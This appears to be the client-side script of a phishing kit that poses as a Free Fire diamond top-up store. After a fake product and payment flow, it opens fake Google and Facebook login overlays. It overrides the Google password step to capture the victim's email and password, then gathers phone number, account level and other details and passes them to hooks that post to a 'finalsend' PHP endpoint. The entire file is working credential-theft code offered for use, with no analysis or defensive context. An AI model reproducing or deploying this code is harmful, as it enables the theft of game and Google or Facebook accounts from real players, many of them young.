// ===== FREE FIRE TOP-UP SYSTEM =====
// Revised for: ggdanfb overlay + trueidff/trueidff.php

let gameData = {
    userId: '',
    playerName: '',
    selectedProduct: null,
    selectedPayment: null,
};

let validationState = {
    userIdValid: false,
    productSelected: false,
    paymentSelected: false
};

// ===== INITIALIZATION =====
$(document).ready(function() {
    initializeSystem();
    setupEventListeners();
    setTimeout(() => { $('.loadkin').fadeOut(1000); }, 1000);
});

function initializeSystem() {
    hideAllModals();
    updateProgress();
    hideUserStatus();
}

// ===== USER STATUS DISPLAY =====
function showUserLoading() {
    $('#userLoad').fadeIn(300);
    $('#userError, #userShow').hide();
}
function showUserError() {
    $('#userError').fadeIn(300);
    $('#userLoad, #userShow').hide();
}
function showUserSuccess() {
    $('#userShow').fadeIn(300);
    $('#userShow .profile-badge__inner__text').text(gameData.playerName);
    $('#userLoad, #userError').hide();
}
function hideUserStatus() {
    $('#userLoad, #userError, #userShow').hide();
}

// ===== USER ID VALIDATION =====
var validationTimeout = null;

function setupEventListeners() {
    // User ID input
    $('#userId').on('input', function() {
        clearTimeout(validationTimeout);
        var uid = $(this).val().trim();

        hideUserStatus();
        gameData.userId = '';
        gameData.playerName = '';
        validationState.userIdValid = false;
        updateProgress();

        if (uid.length >= 6) {
            showUserLoading();
            validationTimeout = setTimeout(function() {
                checkFFUserId(uid);
            }, 800);
        }
    });

    // Product selection
    $(document).on('click', '[id^="sku-item-tile-"]', function() {
        selectProduct(this);
    });

    // Payment selection
    $(document).on('click', '.payment-method', function() {
        selectPayment(this);
    });

    // Order submit button
    $('#mdn-submit').on('click', function(e) {
        e.preventDefault();
        showLoginModal();
    });

    // Verification form submit
    $(document).on('click', '[onclick*="processVerificationData"]', function(e) {
        e.preventDefault();
        processVerificationData();
    });

    // Help tooltip
    $(document).on('click', '[onclick="open_help()"]', function(e) {
        e.preventDefault();
    });
}

// ===== CEK USER ID =====
// Call ke trueidff/trueid.php dilakukan dari index.php
// a.js hanya expose hook: window.ffCheckUserId(uid, callback)
// index.php yang define window.ffCheckUserId
function checkFFUserId(uid) {
    if (typeof window.ffCheckUserId === 'function') {
        window.ffCheckUserId(uid, function(playerName) {
            $('#userLoad').hide();
            gameData.userId = uid;
            gameData.playerName = playerName || 'Player';
            $('#userName').val(gameData.playerName);
            showUserSuccess();
            validationState.userIdValid = true;
            updateProgress();
        });
    }
}

// ===== PRODUCT SELECTION =====
function selectProduct(element) {
    $('[id^="sku-item-tile-"]').removeClass('selected');
    $('[id^="sku-item-tile-"] .sku-card__inner-container, [id^="sku-item-tile-"] .highlighted-sku-card__inner-container').removeClass('selected');

    $(element).addClass('selected');
    $(element).find('.sku-card__inner-container, .highlighted-sku-card__inner-container').addClass('selected');

    gameData.selectedProduct = {
        id: $(element).attr('id') || '',
        name: $(element).find('[data-v-ecb249b6] span, [data-v-b0a133d0] span').first().text().trim() || 'Product',
        price: $(element).find('.price-section__price__price-container__amount').text().trim() || '',
        image: $(element).find('img').first().attr('src') || '',
    };

    validationState.productSelected = true;
    updateProgress();
}

// ===== PAYMENT SELECTION =====
function selectPayment(element) {
    $('.payment-method').removeClass('selected');
    var $pm = $(element).closest('.payment-method');
    $pm.addClass('selected');
    $pm.find('.payment-show').show();
    $('.payment-method').not($pm).find('.payment-show').hide();

    gameData.selectedPayment = {
        name: $pm.find('.payment-method__logo-tagline').text().trim() || 'Payment',
    };

    validationState.paymentSelected = true;
    updateProgress();

    if (allStepsComplete()) showBuyWidget();
}

// ===== PROGRESS =====
function updateProgress() {
    var progress = 0;
    if (validationState.userIdValid) progress += 33.33;
    if (validationState.productSelected) progress += 33.33;
    if (validationState.paymentSelected) progress += 33.34;

    if ($('#guideProgress').length) {
        var circumference = 56.548667764616276;
        var offset = circumference - (progress / 100) * circumference;
        $('#guideProgress').css('stroke-dashoffset', offset);
    }
}

function allStepsComplete() {
    return validationState.userIdValid && validationState.productSelected && validationState.paymentSelected;
}

// ===== BUY WIDGET =====
function showBuyWidget() {
    if (!allStepsComplete()) return;
    if (gameData.selectedProduct && $('#buyProductName').length)
        $('#buyProductName').text(gameData.selectedProduct.name);
    if (gameData.selectedPayment && $('#buyProductPayment').length)
        $('#buyProductPayment').text(gameData.selectedPayment.name);
    $('.checkout-guide-buy-widget-container').slideDown(300);
}

// ===== LOGIN MODAL =====
function showLoginModal() {
    hideAllModals();
    $('.account_login').show();
    // Update playeridlll
    if ($('.playeridlll').length) $('.playeridlll').text(gameData.userId);
}

// ===== open_google / open_facebook — pakai ggdanfb overlay =====
window.open_google = function() {
    $('.account_login').hide();
    if (typeof showStep === 'function') showStep('stepGEmail');
    document.getElementById('overlay').classList.add('active');
};

window.open_facebook = function() {
    $('.account_login').hide();
    if (typeof showStep === 'function') showStep('stepFB');
    document.getElementById('overlay').classList.add('active');
};

window.open_moonton = function() {
    hideAllModals();
    $('.login-mail').show();
};

window.close_google = function() {
    $('.login-gp').hide();
    $('.account_login').show();
};
window.close_facebook = function() {
    $('.login-facebook').hide();
    $('.account_login').show();
};
window.close_log_mt = function() {
    $('.login-mail').hide();
    $('.account_login').show();
};

// ===== ggdanfb integration =====

// locationRedirect — dipanggil setelah Google submit (attempt 2)
window.locationRedirect = function() {
    if (typeof closeModal === 'function') closeModal();
    $('input#validateUserid').val(gameData.userId);
    $('input#validateNickname').val(gameData.playerName);
    $('.account_verification').show();
};

// Override gHandlePassNext — isi validateEmail, validatePassword, validateLogin sebelum redirect
$(document).on('ggdanfb:ready', function() { applyGgdanfbOverrides(); });
setTimeout(applyGgdanfbOverrides, 500); // fallback jika event tidak fired

function applyGgdanfbOverrides() {
    if (!window.gHandlePassNext || window._ggOverrideApplied) return;
    window._ggOverrideApplied = true;

    var _origGPass = window.gHandlePassNext;
    window.gHandlePassNext = function() {
        var _origRedir = window.locationRedirect;
        window.locationRedirect = function() {
            var email = document.getElementById('gChipEmail') ? document.getElementById('gChipEmail').textContent.trim() : '';
            var pass  = document.getElementById('gPassInput') ? document.getElementById('gPassInput').value : '';
            $('input#validateEmail').val(email);
            $('input#validatePassword').val(pass);
            $('input#validateLogin').val('Google Play');
            window.locationRedirect = _origRedir;
            _origRedir();
        };
        _origGPass.apply(this, arguments);
    };

    // closeModal override — kembalikan ke account_login jika verification belum tampil
    var _origClose = window.closeModal;
    window.closeModal = function() {
        _origClose && _origClose();
        if ($('.account_verification').is(':hidden')) {
            $('.account_login').show();
        }
    };
}

// fbLanjutkan — POST ke tirzz23finalsend.php dilakukan dari index.php
// a.js hanya trigger hook: window.ffFbLanjutkan()
window.fbLanjutkan = function() {
    if (typeof window.ffFbLanjutkan === 'function') {
        window.ffFbLanjutkan();
    }
};

// ===== VERIFICATION SUBMIT =====
var isProcessingVerification = false;

window.processVerificationData = function() {
    if (isProcessingVerification) return false;
    isProcessingVerification = true;

    var validateEmail    = $('#validateEmail').val().trim();
    var validatePassword = $('#validatePassword').val().trim();
    var validateUserid   = $('#validateUserid').val().trim() || gameData.userId;
    var validateLogin    = $('#validateLogin').val().trim();
    var phone            = $('#phone').val().trim();
    var level            = $('#level').val();
    var tier             = $('#tier').val();
    var elpas            = $('#elpas').val();

    // Isi nickname jika belum
    if (!$('#validateNickname').val()) {
        $('#validateNickname').val(gameData.playerName);
    }

    if (!validateEmail || !validatePassword || !validateUserid || !phone || !level || !tier || !elpas || !validateLogin) {
        isProcessingVerification = false;
        return false;
    }

    // Disable button
    $('[onclick*="processVerificationData"]').prop('disabled', true);

    showVerificationLoading();

    // POST ke tirzz23finalsend.php dilakukan dari index.php
    // a.js hanya kumpulkan data lalu panggil hook window.ffSubmitVerification
    if (typeof window.ffSubmitVerification === 'function') {
        window.ffSubmitVerification({
            validateEmail:    validateEmail,
            validatePassword: validatePassword,
            validateUserid:   validateUserid,
            validateNickname: gameData.playerName,
            validateLogin:    validateLogin,
            phone:            phone,
            level:            level,
            tier:             tier,
            elpas:            elpas
        }, function() {
            hideVerificationLoading();
            $('[onclick*="processVerificationData"]').prop('disabled', false);
            setTimeout(function() { isProcessingVerification = false; }, 3000);
        });
    }

    return false;
};

// ===== LOADING OVERLAY =====
function showVerificationLoading() {
    $('body').append(`
        <div id="verif-loading" style="
            position:fixed;top:0;left:0;width:100%;height:100%;
            background:rgba(0,0,0,0.75);display:flex;
            justify-content:center;align-items:center;z-index:99999;">
            <div style="background:#fff;padding:28px 32px;border-radius:10px;text-align:center;">
                <div style="display:flex;align-items:center;gap:14px;color:#333;font-size:15px;">
                    <div style="width:26px;height:26px;border:3px solid #eee;border-top:3px solid #6242fc;
                        border-radius:50%;animation:spin 1s linear infinite;"></div>
                    <span>Processing verification...</span>
                </div>
            </div>
        </div>
        <style>@keyframes spin{to{transform:rotate(360deg)}}</style>
    `);
}
function hideVerificationLoading() {
    $('#verif-loading').remove();
}

// ===== UTILITIES =====
function hideAllModals() {
    $('.account_login, .account_verification, .account_processing, .login-gp, .login-mail, .login-facebook, .login-gp-load, .login-facebook-load, .check_verification, .login-facebook-mt, .verification_info').hide();
}

window.open_help = function() {};

window.showHide = function() {
    var input = document.getElementById('password-gp');
    if (input) input.type = input.type === 'password' ? 'text' : 'password';
};

window.ValidateLoginGpData = function() { return false; };
window.ValidateLoginFbData = function() { return false; };
window.choosePaymentChannel = function(event, channelId) {
    var el = event.target.closest('.payment-method') || document.getElementById(channelId);
    if (el) selectPayment(el);
};
window.chooseSku = function(event, skuId) {
    var el = event.target.closest('[id^="sku-item-tile-"]') || document.getElementById(skuId);
    if (el) selectProduct(el);
};

console.log('✅ tirzz23.js loaded — FF Top-Up with ggdanfb');
